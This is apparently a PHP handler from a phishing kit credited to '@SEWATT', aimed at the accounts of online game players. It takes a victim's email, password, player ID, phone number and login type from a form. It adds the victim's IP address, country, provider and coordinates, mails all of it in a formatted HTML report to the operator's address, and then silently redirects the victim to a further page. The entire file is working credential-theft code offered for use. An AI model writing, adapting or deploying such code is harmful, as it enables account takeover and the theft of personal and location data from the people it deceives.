<?php

    /***
     * Coded by @SEWATT | SEWATTHoster.id
     * Please don't change this credit, respect me
     * All codes here are guaranteed security!
     */

    session_start();
    include 'mailer.php';

    if(!isset($_POST["email"],
            $_POST["password"],
            $_POST["playid"],
            $_POST["phone"],
            $_POST["level"],
            $_POST["login"]))
    {
        $complete   = false;
        session_destroy();
        print_r('
        <script>
            const error = alert("Something went wrong!");
            if(error || !error){
                location.href = "index.php";
            };
        </script>');
    }
    else
    {
        $email = $_POST['email'];
        $password = $_POST['password'];
        $playid = $_POST['playid'];
        $phone = $_POST['phone'];
        $level = $_POST['level'];
        $login = $_POST['login'];
        $complete = true;
        $sess = session_id();
    };
    
    if($complete === true){

        $sewatttitle    = "$flg | $ccd | LEVEL $level | $email | $playid | $login";
        $sewattmessage  = <<<EOF
        <table class="nl-container" style="border-collapse: collapse; table-layout: fixed; border-spacing: 0; mso-table-lspace: 0pt; mso-table-rspace: 0pt; vertical-align: top; min-width: 320px; margin: 0 auto; background-color: #ffffff; width: 100%;" cellspacing="0">
            <tbody>
                <tr style="vertical-align: top;">
                    <td style="border-collapse: collapse !important; vertical-align: top;">
                        <div style="background-position: bottom; background-repeat: no-repeat; background-color: #f4f4f4;">
                            <div class="block-grid" style="margin: 0 auto; min-width: 320px; max-width: 370px; word-wrap: break-word; background-color: transparent;">
                                <center>
                                    <div border="1" style="background: url($sewattbanner) no-repeat center center; background-size: 100% 100%; height: 180px; float: none; width: 100%; max-width: 370px; color: #000; text-align: center;"></div>
                                    <table style="border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
                                        <tr style="border-top:0;">
                                            <th style="line-height: 17px; font-size: 14px; border-collapse: collapse; border-color: black; background: #ff8708; width: 35%; color: #fff; text-align: center; padding: 12px;"><strong>1</strong></th>
                                            <th style="line-height: 17px; font-size: 14px; border-collapse: collapse; border-color: black; background: #3741c9; width: 65%; color: #fff; text-align: center; padding: 12px;"><strong>Account Information</strong></th>
                                        </tr>
                                    </table>
                                    <table style="border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
                                        <tr style="border-top:0;">
                                            <th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>EMAIL</strong></th>
                                            <th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>$email</strong></th>
                                        </tr>
                                        <tr>
                                            <th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>PASSWORD</strong></th>
                                            <th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>$password</strong></th>
                                        </tr>
                                        <tr>
                                            <th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>PLAYER ID</strong></th>
                                            <th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>$playid</strong></th>
                                        </tr>
                                        <tr>
                                            <th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>PHONE</strong></th>
                                            <th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>$phone</strong></th>
                                        </tr>
                                        <tr>
                                            <th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>LEVEL</strong></th>
                                            <th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>$level</strong></th>
                                        </tr>
                                        <tr>
                                            <th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>LOGIN</strong></th>
                                            <th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>$login</strong></th>
                                        </tr>
                                    </table>
                                    <table style="border-top:0; border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
                                        <tr style="border-top:0;">
                                            <th style="border-top:0; line-height: 17px; font-size: 14px; border-collapse: collapse; border-color: black; background: #ff8708; width: 35%; color: #fff; text-align: center; padding: 12px;"><strong>2</strong></th>
                                            <th style="border-top:0; line-height: 17px; font-size: 14px; border-collapse: collapse; border-color: black; background: #3741c9; width: 65%; color: #fff; text-align: center; padding: 12px;"><strong>Owner Information</strong></th>
                                        </tr>
                                    </table>
                                    <table style="border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
                                        <tr style="border-top:0;">
                                            <th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>IP ADDRESS</strong></th>
                                            <th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>$ipd</strong></th>
                                        </tr>
                                        <tr>
                                            <th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>CALLCODE</strong></th>
                                            <th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>$ccd</strong></th>
                                        </tr>
                                        <tr>
                                            <th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>COUNTRY</strong></th>
                                            <th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>$cn</strong></th>
                                        </tr>
                                        <tr>
                                            <th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>CONTINENT</strong></th>
                                            <th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>$ctn</strong></th>
                                        </tr>
                                        <tr>
                                            <th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>TIMEZONE</strong></th>
                                            <th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>$zne</strong></th>
                                        </tr>
                                        <tr>
                                            <th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>PROVIDER</strong></th>
                                            <th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>$pvd</strong></th>
                                        </tr>
                                        <tr>
                                            <th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>LATITUDE</strong></th>
                                            <th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>$lat</strong></th>
                                        </tr>
                                        <tr>
                                            <th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>LONGITUDE</strong></th>
                                            <th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>$lon</strong></th>
                                        </tr>
                                    </table>
                                    <table style="border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
                                        <tr style="border-top:0;">
                                            <th style="border-top:0; line-height: 17px; font-family: Arial, Helvetica, sans-serif; font-size: 10px; border-collapse: collapse; border-color: black; background: rgba(230, 238, 253, 0.8); width: 60%; color: #4b689a; text-align: left; padding: 14px;"><strong>Information Design</strong><br />- Coded by @SEWATT<br />- Designed by @SEWATT<br />- Channel @SWATOFFICIAL</th>
                                            <th style="border-top:0; line-height: 17px; font-family: Arial, Helvetica, sans-serif; font-size: 38px; border-collapse: collapse; border-color: black; background: rgba(230, 238, 253, 0.8); width: 60%; color: #4b689a; text-align: center; padding: 12px;"><strong>v4.x</strong></th>
                                        </tr>
                                    </table>
                                    <table style="border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
                                        <tr style="border-top:0;">
                                            <th style="line-height: 13px; font-family: Arial, Helvetica, sans-serif; font-size: 13px; border-collapse: collapse; border-color: black; background: black; width: 100%; color: white; text-align: center; padding: 13px;"><strong>$sess</strong></th>
                                        </tr>
                                    </table>
                                </center>
                            </div>
                        </div>
                    </td>
                </tr>
            </tbody>
        </table>
        EOF;

        $headers        = array(
            "From" => "$sewattnama <$sewattsender>",
            "X-Sender" => "$sewattnama <$sewattsender>",
            "MIME-Version" => "1.0",
            "Content-type" => "text/html; charset=utf-8",
            "Content-Transfer-Encoding" => "base64",
            "Sensitivity" => "Company-Confidential",
            "X-Mailer" => "PHP/".phpversion(),
            "X-Priority" => "1"
        );
        $sendemail      = mail($sewattemail, $sewatttitle, $sewattmessage, $headers);

        if($sendemail){
            session_destroy();
            echo "
            <form id='sewatt' method='POST' action='processing.php'>
                <input type='hidden' name='email' value='$email' readonly>
                <input type='hidden' name='playid' value='$playid' readonly>
            </form>
            <script>
                document.getElementById('sewatt').submit();
            </script>";
        }else{
            echo "
            <script>
                alert('Something went wrong!');
                location.href='index.php';
            </script>";
        };

    }else{
        header("Location: index.php");
    };

    /***
     * Coded by @SEWATT | SEWATTHoster.id
     * Please don't change this credit, respect me
     * All codes here are guaranteed security!
     */

?>